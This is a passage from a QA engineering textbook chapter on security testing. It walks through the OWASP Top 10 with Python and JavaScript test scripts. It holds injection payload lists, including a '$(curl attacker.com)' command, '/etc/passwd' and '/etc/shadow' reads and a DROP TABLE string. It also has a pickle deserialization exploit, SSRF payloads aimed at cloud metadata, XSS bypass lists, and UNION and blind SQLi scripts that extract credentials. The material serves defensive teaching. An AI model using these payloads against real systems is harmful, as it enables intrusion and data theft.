# CHAPTER 07: Security Testing for QA Engineers

## Introduction

Security testing has evolved from a specialized discipline handled by dedicated security teams to a core competency expected of modern QA engineers. As applications become increasingly complex and interconnected, the attack surface expands exponentially, making security testing not just important but absolutely critical to software quality assurance.

This chapter provides QA engineers with practical, actionable knowledge for identifying and testing common security vulnerabilities. We'll explore the OWASP Top 10, dive deep into specific attack vectors like XSS and SQL injection, examine authentication and authorization testing strategies, and master the tools that make security testing efficient and effective.

Security testing isn't about becoming a penetration tester overnight—it's about developing a security-conscious mindset, understanding common vulnerability patterns, and integrating security checks into your existing testing workflows. By the end of this chapter, you'll be equipped to identify security flaws before they reach production, communicate effectively with security teams, and contribute meaningfully to your organization's security posture.

## Understanding the OWASP Top 10

The OWASP (Open Web Application Security Project) Top 10 represents the most critical security risks to web applications, updated every few years based on real-world data from security practitioners worldwide. The 2021 edition (current as of this writing) reflects the evolving threat landscape and serves as an essential framework for security testing.

### The OWASP Top 10 (2021 Edition)

**A01:2021 – Broken Access Control**

Broken access control occurs when users can act outside their intended permissions. This was the most critical category in 2021, moving up from fifth position in 2017.

Common scenarios include:
- Accessing another user's account by manipulating URL parameters
- Elevation of privilege (acting as admin without proper authentication)
- Metadata manipulation (replaying or tampering with JWT tokens)
- CORS misconfiguration allowing unauthorized API access

Testing approach:
```bash
# Test horizontal privilege escalation
# User A (ID: 123) tries to access User B's data (ID: 456)
curl -X GET "https://api.example.com/users/456/profile" \
  -H "Authorization: Bearer USER_A_TOKEN"

# Test vertical privilege escalation
# Regular user tries to access admin endpoint
curl -X GET "https://api.example.com/admin/users" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN"

# Test IDOR (Insecure Direct Object Reference)
curl -X DELETE "https://api.example.com/documents/789" \
  -H "Authorization: Bearer USER_A_TOKEN"
# Should fail if document belongs to different user
```

**A02:2021 – Cryptographic Failures**

Previously known as "Sensitive Data Exposure," this category focuses on failures related to cryptography (or lack thereof), which often leads to exposure of sensitive data.

Testing checklist:
- Is data transmitted over HTTP instead of HTTPS?
- Are passwords stored in plaintext or with weak hashing (MD5, SHA1)?
- Are deprecated cryptographic algorithms in use (DES, RC4)?
- Is sensitive data cached or logged?
- Are encryption keys hardcoded or poorly managed?

Testing example:
```python
import requests
import ssl

def test_ssl_configuration(url):
    """Test SSL/TLS configuration"""
    try:
        # Test for HTTP support
        response = requests.get(url.replace('https://', 'http://'))
        if response.status_code == 200:
            print(f"❌ FAIL: Site accessible over HTTP")
        else:
            print(f"✓ PASS: HTTP correctly rejected")
    except:
        print(f"✓ PASS: HTTP not supported")
    
    # Test SSL certificate
    try:
        requests.get(url, verify=True)
        print(f"✓ PASS: Valid SSL certificate")
    except ssl.SSLError as e:
        print(f"❌ FAIL: SSL Error - {e}")

def test_sensitive_data_in_response(response):
    """Check for sensitive data in API responses"""
    sensitive_patterns = [
        'password', 'ssn', 'credit_card', 'api_key',
        'secret', 'token', 'private_key'
    ]
    
    response_text = response.text.lower()
    for pattern in sensitive_patterns:
        if pattern in response_text:
            print(f"⚠ WARNING: Potential sensitive data: {pattern}")
```

**A03:2021 – Injection**

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. SQL, NoSQL, OS command, and LDAP injection are all common variants.

SQL Injection testing:
```python
# Test cases for SQL injection detection
sql_injection_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "' UNION SELECT NULL--",
    "1' AND 1=2 UNION SELECT database()--",
    "'; DROP TABLE users--",
    "1' WAITFOR DELAY '0:0:5'--",  # Time-based blind SQLi
]

def test_sql_injection(base_url, param_name):
    """Test for SQL injection vulnerabilities"""
    results = []
    
    for payload in sql_injection_payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{base_url}?{param_name}={encoded_payload}"
        
        try:
            start_time = time.time()
            response = requests.get(test_url, timeout=10)
            elapsed = time.time() - start_time
            
            # Check for SQL error messages
            sql_errors = [
                'mysql_fetch_array', 'sql syntax', 'odbc_exec',
                'postgresql', 'ora-00933', 'microsoft sql',
                'sqlite_', 'pg_query', 'division by zero'
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    results.append({
                        'payload': payload,
                        'vulnerable': True,
                        'evidence': error
                    })
                    break
            
            # Time-based detection
            if 'WAITFOR' in payload and elapsed > 5:
                results.append({
                    'payload': payload,
                    'vulnerable': True,
                    'evidence': f'Response delayed {elapsed:.2f}s'
                })
                
        except Exception as e:
            results.append({
                'payload': payload,
                'error': str(e)
            })
    
    return results
```

NoSQL Injection testing:
```javascript
// MongoDB NoSQL injection payloads
const noSqlPayloads = [
  { username: { $ne: null }, password: { $ne: null } },
  { username: { $gt: "" }, password: { $gt: "" } },
  { username: "admin", password: { $regex: ".*" } },
  { username: { $where: "1==1" }, password: "any" }
];

async function testNoSqlInjection(apiUrl) {
  for (const payload of noSqlPayloads) {
    try {
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.token || data.authenticated) {
          console.log('❌ VULNERABLE: NoSQL injection successful');
          console.log('Payload:', JSON.stringify(payload));
          return { vulnerable: true, payload };
        }
      }
    } catch (error) {
      console.log('Error testing payload:', payload);
    }
  }
  console.log('✓ PASS: NoSQL injection tests passed');
  return { vulnerable: false };
}
```

Command Injection testing:
```python
# OS Command injection payloads
command_injection_payloads = [
    "; ls -la",
    "| whoami",
    "& ipconfig /all",
    "`cat /etc/passwd`",
    "$(curl attacker.com)",
    "; sleep 10",
    "| ping -c 5 127.0.0.1",
    "&& cat /etc/shadow",
]

def test_command_injection(url, param_name):
    """Test for OS command injection"""
    for payload in command_injection_payloads:
        params = {param_name: f"normal_value{payload}"}
        
        start_time = time.time()
        response = requests.get(url, params=params, timeout=15)
        elapsed = time.time() - start_time
        
        # Check for command output indicators
        indicators = [
            'root:', 'bash', '/bin/', 'Windows IP',
            'total ', 'drwx', 'uid=', 'gid='
        ]
        
        for indicator in indicators:
            if indicator in response.text:
                print(f"❌ VULNERABLE: Command injection detected")
                print(f"Payload: {payload}")
                print(f"Evidence: Found '{indicator}' in response")
                return True
        
        # Time-based detection
        if 'sleep' in payload.lower() and elapsed > 10:
            print(f"❌ VULNERABLE: Time-based command injection")
            print(f"Payload: {payload}")
            print(f"Response time: {elapsed:.2f}s")
            return True
    
    return False
```

**A04:2021 – Insecure Design**

Insecure design represents a broad category focusing on risks related to design and architectural flaws. This requires threat modeling, secure design patterns, and reference architectures.

Testing insecure design requires understanding the business logic:

```python
def test_business_logic_flaws():
    """Test common business logic vulnerabilities"""
    
    # Test 1: Negative quantity/price
    cart_payload = {
        "items": [
            {"product_id": 123, "quantity": -1, "price": 99.99}
        ]
    }
    response = requests.post("https://api.example.com/cart/add", json=cart_payload)
    assert response.status_code == 400, "❌ Accepts negative quantities"
    
    # Test 2: Race condition in limited resource
    # Attempt to book same resource simultaneously
    import threading
    results = []
    
    def book_resource():
        r = requests.post("https://api.example.com/bookings", 
                         json={"resource_id": 999})
        results.append(r.status_code == 200)
    
    threads = [threading.Thread(target=book_resource) for _ in range(10)]
    for t in threads: t.start()
    for t in threads: t.join()
    
    if sum(results) > 1:
        print("❌ FAIL: Race condition allows overbooking")
    
    # Test 3: Price manipulation
    # Modify price in client-side request
    order_payload = {
        "product_id": 123,
        "quantity": 1,
        "price": 0.01  # Tampered price
    }
    response = requests.post("https://api.example.com/orders", json=order_payload)
    if response.status_code == 200:
        print("❌ FAIL: Server trusts client-provided price")
    
    # Test 4: Unlimited resource consumption
    # Test for rate limiting
    for i in range(1000):
        r = requests.post("https://api.example.com/expensive-operation")
        if i == 999 and r.status_code == 200:
            print("❌ FAIL: No rate limiting on expensive operation")
```

**A05:2021 – Security Misconfiguration**

Security misconfiguration occurs when security settings are defined, implemented, or maintained improperly. This is the most common issue, affecting 90% of applications.

Testing checklist:
```python
def security_configuration_audit(base_url):
    """Comprehensive security configuration testing"""
    
    issues = []
    
    # Test 1: Check security headers
    response = requests.get(base_url)
    required_headers = {
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
        'X-Content-Type-Options': 'nosniff',
        'Content-Security-Policy': None,  # Should exist
        'X-XSS-Protection': '1; mode=block',
        'Referrer-Policy': 'no-referrer'
    }
    
    for header, expected in required_headers.items():
        actual = response.headers.get(header)
        if not actual:
            issues.append(f"Missing security header: {header}")
        elif expected and actual not in expected:
            issues.append(f"Weak {header}: {actual}")
    
    # Test 2: Check for information disclosure
    info_disclosure_paths = [
        '/.git/config',
        '/.env',
        '/phpinfo.php',
        '/server-status',
        '/.DS_Store',
        '/web.config',
        '/backup.sql',
        '/.aws/credentials'
    ]
    
    for path in info_disclosure_paths:
        r = requests.get(f"{base_url}{path}")
        if r.status_code == 200:
            issues.append(f"Information disclosure: {path} accessible")
    
    # Test 3: Directory listing
    r = requests.get(f"{base_url}/assets/")
    if 'Index of' in r.text or 'Directory listing' in r.text:
        issues.append("Directory listing enabled")
    
    # Test 4: Verbose error messages
    r = requests.get(f"{base_url}/nonexistent?error=true")
    error_indicators = ['stack trace', 'line ', 'file:', 'exception']
    if any(ind in r.text.lower() for ind in error_indicators):
        issues.append("Verbose error messages expose internals")
    
    # Test 5: Default credentials
    default_creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'root'),
        ('test', 'test')
    ]
    
    for username, password in default_creds:
        r = requests.post(f"{base_url}/login", 
                         data={'username': username, 'password': password})
        if r.status_code == 200 and 'dashboard' in r.text.lower():
            issues.append(f"Default credentials work: {username}/{password}")
    
    return issues
```

**A06:2021 – Vulnerable and Outdated Components**

Using components with known vulnerabilities is a prevalent issue. This includes libraries, frameworks, and other software modules that run with full privileges.

Dependency scanning test:
```python
import json
import subprocess

def check_vulnerable_dependencies(project_path):
    """Check for vulnerable dependencies using npm audit"""
    
    # For Node.js projects
    npm_audit_cmd = ["npm", "audit", "--json"]
    result = subprocess.run(npm_audit_cmd, 
                          cwd=project_path, 
                          capture_output=True, 
                          text=True)
    
    if result.returncode != 0:
        audit_data = json.loads(result.stdout)
        
        vulnerabilities = {
            'critical': audit_data.get('metadata', {}).get('vulnerabilities', {}).get('critical', 0),
            'high': audit_data.get('metadata', {}).get('vulnerabilities', {}).get('high', 0),
            'moderate': audit_data.get('metadata', {}).get('vulnerabilities', {}).get('moderate', 0),
            'low': audit_data.get('metadata', {}).get('vulnerabilities', {}).get('low', 0)
        }
        
        print(f"❌ Found vulnerabilities:")
        for severity, count in vulnerabilities.items():
            if count > 0:
                print(f"  {severity.upper()}: {count}")
        
        # List specific vulnerable packages
        for vuln_id, details in audit_data.get('vulnerabilities', {}).items():
            print(f"\n{details['name']} ({details['severity']})")
            print(f"  Range: {details['range']}")
            print(f"  Fix: {details.get('fixAvailable', 'N/A')}")
    
    # For Python projects
    pip_audit_cmd = ["pip-audit", "--format", "json"]
    result = subprocess.run(pip_audit_cmd, 
                          capture_output=True, 
                          text=True)
    
    if result.stdout:
        pip_vulns = json.loads(result.stdout)
        if pip_vulns:
            print(f"\n❌ Python vulnerabilities found:")
            for vuln in pip_vulns:
                print(f"  {vuln['name']} {vuln['version']}")
                print(f"  CVE: {vuln.get('id', 'N/A')}")
                print(f"  Fix: Upgrade to {vuln.get('fix_version', 'N/A')}")
```

**A07:2021 – Identification and Authentication Failures**

Previously known as "Broken Authentication," this category includes failures to confirm the user's identity, authentication, and session management.

Comprehensive authentication testing:
```python
def test_authentication_security(base_url):
    """Test authentication mechanisms"""
    
    # Test 1: Brute force protection
    print("Testing brute force protection...")
    for i in range(100):
        response = requests.post(f"{base_url}/login",
                               data={'username': 'admin', 
                                    'password': f'wrong{i}'})
        if i == 99 and response.status_code != 429:
            print("❌ FAIL: No rate limiting on login")
    
    # Test 2: Password complexity
    weak_passwords = ['123456', 'password', 'admin', 'test', '']
    for pwd in weak_passwords:
        response = requests.post(f"{base_url}/register",
                               data={'username': 'testuser', 
                                    'password': pwd})
        if response.status_code == 200:
            print(f"❌ FAIL: Weak password accepted: {pwd}")
    
    # Test 3: Session fixation
    # Get session before login
    r1 = requests.get(f"{base_url}/")
    session_before = r1.cookies.get('SESSIONID')
    
    # Login
    r2 = requests.post(f"{base_url}/login",
                      data={'username': 'test', 'password': 'Test123!'},
                      cookies={'SESSIONID': session_before})
    session_after = r2.cookies.get('SESSIONID')
    
    if session_before == session_after:
        print("❌ FAIL: Session fixation vulnerability")
    
    # Test 4: Session timeout
    login_response = requests.post(f"{base_url}/login",
                                  data={'username': 'test', 
                                       'password': 'Test123!'})
    session_cookie = login_response.cookies.get('SESSIONID')
    
    # Wait and try to access protected resource
    time.sleep(1800)  # 30 minutes
    protected_response = requests.get(f"{base_url}/dashboard",
                                     cookies={'SESSIONID': session_cookie})
    if protected_response.status_code == 200:
        print("❌ FAIL: No session timeout (still valid after 30 min)")
    
    # Test 5: Credential stuffing
    # Test if multiple failed logins from different IPs are blocked
    session = requests.Session()
    for i in range(20):
        session.get(f"{base_url}/")  # Get fresh session
        r = session.post(f"{base_url}/login",
                        data={'username': 'admin', 'password': 'wrong'})
    
    if r.status_code != 429:
        print("❌ FAIL: No protection against credential stuffing")
    
    # Test 6: JWT token security
    token = login_and_get_jwt(base_url)
    if token:
        # Try modifying JWT
        header, payload, signature = token.split('.')
        
        # Decode and modify payload
        import base64
        decoded_payload = base64.b64decode(payload + '==')
        modified_payload = decoded_payload.replace(b'"role":"user"', 
                                                  b'"role":"admin"')
        tampered_payload = base64.b64encode(modified_payload).decode().rstrip('=')
        
        tampered_token = f"{header}.{tampered_payload}.{signature}"
        
        r = requests.get(f"{base_url}/admin",
                        headers={'Authorization': f'Bearer {tampered_token}'})
        if r.status_code == 200:
            print("❌ FAIL: JWT signature not validated")
```

**A08:2021 – Software and Data Integrity Failures**

This new category focuses on making assumptions about software updates, critical data, and CI/CD pipelines without verifying integrity.

Testing approach:
```python
def test_integrity_failures(base_url):
    """Test for software and data integrity issues"""
    
    # Test 1: Insecure deserialization
    import pickle
    import base64
    
    # Create malicious serialized object
    class Exploit:
        def __reduce__(self):
            import os
            return (os.system, ('echo vulnerable > /tmp/pwned',))
    
    malicious_payload = base64.b64encode(pickle.dumps(Exploit()))
    
    response = requests.post(f"{base_url}/api/process",
                           json={'data': malicious_payload.decode()})
    
    # Check if command executed (in safe test environment only!)
    # This is just for demonstration
    
    # Test 2: Unsigned updates
    response = requests.get(f"{base_url}/download/update.exe")
    if 'X-Signature' not in response.headers:
        print("❌ FAIL: Software updates not digitally signed")
    
    # Test 3: CI/CD pipeline secrets
    github_paths = [
        '/.github/workflows/deploy.yml',
        '/.gitlab-ci.yml',
        '/Jenkinsfile',
        '/.circleci/config.yml'
    ]
    
    for path in github_paths:
        r = requests.get(f"{base_url}{path}")
        if r.status_code == 200:
            # Check for hardcoded secrets
            secret_patterns = [
                r'password\s*[:=]\s*["\'][\w]+["\']',
                r'api[-_]?key\s*[:=]\s*["\'][\w]+["\']',
                r'token\s*[:=]\s*["\'][\w]+["\']'
            ]
            import re
            for pattern in secret_patterns:
                if re.search(pattern, r.text, re.IGNORECASE):
                    print(f"❌ FAIL: Secrets in CI/CD config: {path}")
```

**A09:2021 – Security Logging and Monitoring Failures**

Without logging and monitoring, breaches cannot be detected. This category helps detect, escalate, and respond to active breaches.

Testing logging and monitoring:
```python
def test_logging_and_monitoring(base_url):
    """Test security logging and monitoring"""
    
    issues = []
    
    # Test 1: Failed login attempts logged
    response = requests.post(f"{base_url}/login",
                           data={'username': 'admin', 
                                'password': 'wrongpassword'})
    
    # Check if security team gets alerted (would need integration test)
    # For now, just check response
    if 'too many attempts' not in response.text.lower():
        issues.append("Failed logins may not trigger alerts")
    
    # Test 2: Sensitive actions logged
    # Perform sensitive action (delete, admin access, etc.)
    session = login_as_user(base_url, 'testuser')
    
    sensitive_actions = [
        ('POST', '/api/users/delete', {'id': 123}),
        ('PUT', '/api/settings/security', {'2fa': False}),
        ('DELETE', '/api/data/all', {})
    ]
    
    for method, endpoint, data in sensitive_actions:
        if method == 'POST':
            r = session.post(f"{base_url}{endpoint}", json=data)
        elif method == 'PUT':
            r = session.put(f"{base_url}{endpoint}", json=data)
        elif method == 'DELETE':
            r = session.delete(f"{base_url}{endpoint}", json=data)
        
        # Check if audit log endpoint shows this action
        audit_log = session.get(f"{base_url}/api/audit-log")
        if endpoint not in audit_log.text:
            issues.append(f"Sensitive action not logged: {endpoint}")
    
    # Test 3: Log tampering protection
    # Try to clear logs through API
    r = session.delete(f"{base_url}/api/logs")
    if r.status_code == 200:
        issues.append("Logs can be deleted via API")
    
    # Test 4: Error logging doesn't expose sensitive data
    r = requests.get(f"{base_url}/api/user/999999999")
    if any(pattern in r.text.lower() for pattern in ['select ', 'from ', 'where ']):
        issues.append("Error messages contain SQL queries")
    
    return issues
```

**A10:2021 – Server-Side Request Forgery (SSRF)**

SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. This allows attackers to coerce the application to send requests to unexpected destinations.

SSRF testing:
```python
def test_ssrf_vulnerabilities(base_url):
    """Test for SSRF vulnerabilities"""
    
    # Test 1: Basic SSRF - Internal network access
    ssrf_payloads = [
        'http://127.0.0.1:80',
        'http://localhost:80',
        'http://0.0.0.0:80',
        'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        'http://metadata.google.internal/',  # GCP metadata
        'http://192.168.1.1',  # Internal network
        'file:///etc/passwd',  # Local file access
        'http://[::1]:80',  # IPv6 localhost
    ]
    
    for payload in ssrf_payloads:
        response = requests.post(f"{base_url}/api/fetch-url",
                               json={'url': payload})
        
        if response.status_code == 200:
            print(f"❌ VULNERABLE: SSRF with payload: {payload}")
            if 'root:' in response.text or 'ami-id' in response.text:
                print("  CRITICAL: Sensitive data exposed!")
        
    # Test 2: SSRF with URL bypass techniques
    bypass_payloads = [
        'http://127.1',  # Alternative localhost notation
        'http://127.0.0.1:80@evil.com',  # URL parsing confusion
        'http://evil.com#@127.0.0.1',  # Fragment bypass
        'http://127.0.0.1%23@evil.com',  # Encoded fragment
        'http://127.0.0.1%2F@evil.com',  # Encoded slash
        'http://[::ffff:127.0.0.1]:80',  # IPv6 bypass
    ]
    
    for payload in bypass_payloads:
        response = requests.post(f"{base_url}/api/fetch-url",
                               json={'url': payload})
        if response.status_code == 200:
            print(f"❌ VULNERABLE: SSRF bypass: {payload}")
    
    # Test 3: Blind SSRF
    # Use external service to detect outbound requests
    callback_url = "http://attacker-controlled.burpcollaborator.net"
    response = requests.post(f"{base_url}/api/fetch-url",
                           json={'url': callback_url})
    
    print("Check Burp Collaborator for DNS/HTTP interactions")
    
    # Test 4: SSRF via redirect
    # Set up redirect on attacker server: evil.com -> 127.0.0.1
    response = requests.post(f"{base_url}/api/fetch-url",
                           json={'url': 'http://evil.com/redirect'})
```

## Cross-Site Scripting (XSS) Detection and Testing

Cross-Site Scripting remains one of the most prevalent web vulnerabilities. Understanding XSS types and testing methodologies is crucial for QA engineers.

### Types of XSS

**Reflected XSS**

Reflected XSS occurs when user input is immediately reflected back in the response without proper sanitization.

```python
def test_reflected_xss(base_url):
    """Test for reflected XSS vulnerabilities"""
    
    # Basic XSS payloads
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<marquee onstart=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert(document.domain)</script>',
    ]
    
    # Test in various contexts
    test_params = ['q', 'search', 'name', 'message', 'comment', 'id']
    
    for param in test_params:
        for payload in xss_payloads:
            url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            response = requests.get(url)
            
            # Check if payload appears unencoded in response
            if payload in response.text:
                print(f"❌ VULNERABLE: Reflected XSS in parameter '{param}'")
                print(f"   Payload: {payload}")
                print(f"   URL: {url}")
            
            # Check for encoded but still executable
            if 'onerror' in response.text or 'onload' in response.text:
                print(f"⚠ POTENTIAL: Event handler in response for param '{param}'")
```

**Stored XSS**

Stored XSS is more dangerous because the malicious script is permanently stored on the target server.

```python
def test_stored_xss(base_url, session):
    """Test for stored XSS vulnerabilities"""
    
    xss_payloads = [
        '<script>alert("Stored XSS")</script>',
        '<img src=x onerror=alert("Stored")>',
        '<<script>alert("Stored")</script>',  # WAF bypass
        '<scrİpt>alert("Stored")</scrİpt>',  # Unicode bypass
        '<svg><script>alert("Stored")</script></svg>',
    ]
    
    # Test user profile fields
    profile_fields = ['bio', 'username', 'website', 'company']
    
    for field in profile_fields:
        for payload in xss_payloads:
            # Submit malicious content
            response = session.post(f"{base_url}/api/profile",
                                  json={field: payload})
            
            if response.status_code == 200:
                # Retrieve the profile to see if XSS is executed
                profile_response = session.get(f"{base_url}/profile")
                
                if payload in profile_response.text:
                    print(f"❌ CRITICAL: Stored XSS in field '{field}'")
                    print(f"   Payload: {payload}")
                    
                    # Clean up
                    session.post(f"{base_url}/api/profile",
                               json={field: "safe content"})
    
    # Test comment sections
    comment_payload = '<img src=x onerror=alert(document.cookie)>'
    response = session.post(f"{base_url}/api/comments",
                          json={'text': comment_payload})
    
    if response.status_code == 200:
        # Check if comment appears with XSS
        comments = session.get(f"{base_url}/api/comments")
        if comment_payload in comments.text:
            print("❌ CRITICAL: Stored XSS in comments")
```

**DOM-based XSS**

DOM-based XSS occurs entirely on the client side through DOM manipulation.

```javascript
// DOM XSS detection script
function testDOMXSS() {
    const domXssPayloads = [
        '#<script>alert("DOM XSS")</script>',
        '#<img src=x onerror=alert(1)>',
        '#javascript:alert(document.domain)',
        '#data:text/html,<script>alert("XSS")</script>',
    ];
    
    const vulnerablePatterns = [
        { sink: 'innerHTML', pattern: /innerHTML\s*=/ },
        { sink: 'document.write', pattern: /document\.write\(/ },
        { sink: 'eval', pattern: /eval\(/ },
        { sink: 'setTimeout', pattern: /setTimeout\([^)]*\)/ },
        { sink: 'setInterval', pattern: /setInterval\([^)]*\)/ },
        { sink: 'location', pattern: /location\s*=/ },
    ];
    
    // Check if page uses dangerous sinks with user input
    const scripts = document.getElementsByTagName('script');
    let vulnerabilities = [];
    
    for (let script of scripts) {
        const code = script.textContent;
        
        for (let pattern of vulnerablePatterns) {
            if (pattern.pattern.test(code)) {
                // Check if user-controlled data flows to sink
                const userControlled = [
                    'location.hash',
                    'location.search',
                    'document.URL',
                    'document.referrer',
                    'window.name'
                ];
                
                if (userControlled.some(source => code.includes(source))) {
                    vulnerabilities.push({
                        sink: pattern.sink,
                        snippet: code.substring(0, 100)
                    });
                }
            }
        }
    }
    
    if (vulnerabilities.length > 0) {
        console.error('❌ Potential DOM XSS vulnerabilities:', vulnerabilities);
    }
    
    return vulnerabilities;
}

// Test with payloads
domXssPayloads.forEach(payload => {
    const testUrl = window.location.origin + window.location.pathname + payload;
    console.log(`Testing: ${testUrl}`);
    // In actual testing, you'd navigate or update the URL
});
```

### Advanced XSS Testing Techniques

**Bypass Techniques**

```python
def generate_xss_bypass_payloads():
    """Generate XSS payloads to bypass common filters"""
    
    bypasses = []
    
    # Case variation
    bypasses.append('<ScRiPt>alert(1)</sCrIpT>')
    
    # Encoded payloads
    bypasses.append('%3Cscript%3Ealert(1)%3C/script%3E')
    
    # Double encoding
    bypasses.append('%253Cscript%253Ealert(1)%253C/script%253E')
    
    # HTML entity encoding
    bypasses.append('&lt;script&gt;alert(1)&lt;/script&gt;')
    
    # Unicode bypass
    bypasses.append('<script\\x3Ealert(1)</script>')
    
    # Null byte injection
    bypasses.append('<script>alert(1)</script>\\x00')
    
    # Nested tags
    bypasses.append('<<script>alert(1)</script>>')
    
    # Broken tags
    bypasses.append('<script>alert(1)//</script>')
    
    # Using comments
    bypasses.append('<!--><script>alert(1)</script>')
    
    # JavaScript protocol
    bypasses.append('<a href="javascript:alert(1)">Click</a>')
    
    # Data URI
    bypasses.append('<object data="data:text/html,<script>alert(1)</script>">')
    
    # SVG with script
    bypasses.append('<svg><script>alert(1)</script></svg>')
    
    # MathML
    bypasses.append('<math><mi xlink:href="javascript:alert(1)">test</mi></math>')
    
    # Form element
    bypasses.append('<form action="javascript:alert(1)"><input type="submit"></form>')
    
    # Meta refresh
    bypasses.append('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">')
    
    # Style tag
    bypasses.append('<style>@import"javascript:alert(1)";</style>')
    
    # Link tag
    bypasses.append('<link rel="stylesheet" href="javascript:alert(1)">')
    
    # Base tag
    bypasses.append('<base href="javascript:alert(1)//">')
    
    # Markdown injection (if markdown parsed)
    bypasses.append('[XSS](javascript:alert(1))')
    
    # Template injection (if templates used client-side)
    bypasses.append('{{constructor.constructor("alert(1)")()}}')
    
    return bypasses
```

**Context-Specific XSS Testing**

```python
def test_xss_in_different_contexts(base_url):
    """Test XSS in various HTML contexts"""
    
    # Context 1: Inside HTML tag attribute
    attr_payloads = [
        '" onload="alert(1)"',
        "' onload='alert(1)'",
        '" autofocus onfocus="alert(1)"',
        '"><script>alert(1)</script><input value="',
    ]
    
    for payload in attr_payloads:
        response = requests.get(f"{base_url}?name={payload}")
        if payload in response.text or 'onload' in response.text:
            print(f"❌ XSS in attribute context: {payload}")
    
    # Context 2: Inside JavaScript
    js_payloads = [
        "'; alert(1); //",
        '"; alert(1); //',
        '`; alert(1); //',
        '</script><script>alert(1)</script><script>',
    ]
    
    for payload in js_payloads:
        response = requests.get(f"{base_url}?callback={payload}")
        if payload in response.text:
            print(f"❌ XSS in JavaScript context: {payload}")
    
    # Context 3: Inside CSS
    css_payloads = [
        'expression(alert(1))',
        'url("javascript:alert(1)")',
        '</style><script>alert(1)</script><style>',
    ]
    
    for payload in css_payloads:
        response = requests.get(f"{base_url}?color={payload}")
        if payload in response.text:
            print(f"❌ XSS in CSS context: {payload}")
    
    # Context 4: Inside JSON
    json_payloads = [
        '</script><script>alert(1)</script>',
        '{"xss":"</script><script>alert(1)</script>"}',
    ]
    
    for payload in json_payloads:
        response = requests.get(f"{base_url}/api/data?filter={payload}")
        if '<script>' in response.text and 'application/json' not in response.headers.get('Content-Type', ''):
            print(f"❌ XSS via JSON response: {payload}")
```

## SQL Injection Testing Deep Dive

SQL injection remains one of the most dangerous vulnerabilities. Modern testing requires understanding various injection techniques and database-specific syntax.

### Advanced SQL Injection Techniques

**Union-Based SQL Injection**

```python
def test_union_based_sqli(base_url, param_name):
    """Test for Union-based SQL injection"""
    
    # Step 1: Determine number of columns
    max_columns = 20
    column_count = None
    
    for i in range(1, max_columns + 1):
        union_payload = f"1' UNION SELECT {','.join(['NULL'] * i)}--"
        response = requests.get(f"{base_url}?{param_name}={union_payload}")
        
        if response.status_code == 200 and 'error' not in response.text.lower():
            column_count = i
            print(f"✓ Found column count: {i}")
            break
    
    if not column_count:
        print("Could not determine column count")
        return
    
    # Step 2: Identify string columns
    string_columns = []
    for i in range(column_count):
        test_values = ['NULL'] * column_count
        test_values[i] = "'test'"
        union_payload = f"1' UNION SELECT {','.join(test_values)}--"
        response = requests.get(f"{base_url}?{param_name}={union_payload}")
        
        if 'test' in response.text:
            string_columns.append(i)
            print(f"✓ Column {i+1} accepts strings")
    
    # Step 3: Extract database information
    if string_columns:
        col = string_columns[0]
        
        # Database version
        test_values = ['NULL'] * column_count
        test_values[col] = "@@version"
        payload = f"1' UNION SELECT {','.join(test_values)}--"
        response = requests.get(f"{base_url}?{param_name}={payload}")
        print(f"Database version info in response: {response.text[:200]}")
        
        # Current database
        test_values[col] = "database()"
        payload = f"1' UNION SELECT {','.join(test_values)}--"
        response = requests.get(f"{base_url}?{param_name}={payload}")
        print(f"Current database in response: {response.text[:200]}")
        
        # Extract table names
        test_values[col] = "GROUP_CONCAT(table_name)"
        payload = f"1' UNION SELECT {','.join(test_values)} FROM information_schema.tables WHERE table_schema=database()--"
        response = requests.get(f"{base_url}?{param_name}={payload}")
        print(f"Tables: {response.text[:500]}")
        
        # Extract column names from users table
        test_values[col] = "GROUP_CONCAT(column_name)"
        payload = f"1' UNION SELECT {','.join(test_values)} FROM information_schema.columns WHERE table_name='users'--"
        response = requests.get(f"{base_url}?{param_name}={payload}")
        print(f"Columns in users table: {response.text[:500]}")
        
        # Extract user data
        test_values = ['NULL'] * column_count
        test_values[col] = "GROUP_CONCAT(username,':',password)"
        payload = f"1' UNION SELECT {','.join(test_values)} FROM users--"
        response = requests.get(f"{base_url}?{param_name}={payload}")
        print(f"❌ CRITICAL: User credentials exposed")
```

**Boolean-Based Blind SQL Injection**

```python
def test_boolean_blind_sqli(base_url, param_name):
    """Test for Boolean-based blind SQL injection"""
    
    # Baseline responses
    true_payload = "1' AND '1'='1"
    false_payload = "1' AND '1'='2"
    
    true_response = requests.get(f"{base_url}?{param_name}={true_payload}")
    false_response = requests.get(f"{base_url}?{param_name}={false_payload}")
    
    # Check if responses differ
    if len(true_response.text) != len(false_response.text) or \
       true_response.status_code != false_response.status_code:
        print("✓ Boolean-based blind SQLi likely present")
        
        # Extract database name character by character
        db_name = ""
        for pos in range(1, 50):
            for ascii_val in range(32, 127):
                payload = f"1' AND ASCII(SUBSTRING(database(),{pos},1))={ascii_val}--"
                response = requests.get(f"{base_url}?{param_name}={payload}")
                
                if len(response.text) == len(true_response.text):
                    db_name += chr(ascii_val)
                    print(f"Database name so far: {db_name}")
                    break
            else:
                break  # No more characters
        
        print(f"❌ Extracted database name: {db_name}")
        return db_name
    else:
        print("No significant difference in responses")
        return None
```

**Time-Based Blind SQL Injection**

```python
import time

def test_time_based_blind_sqli(base_url, param_name):
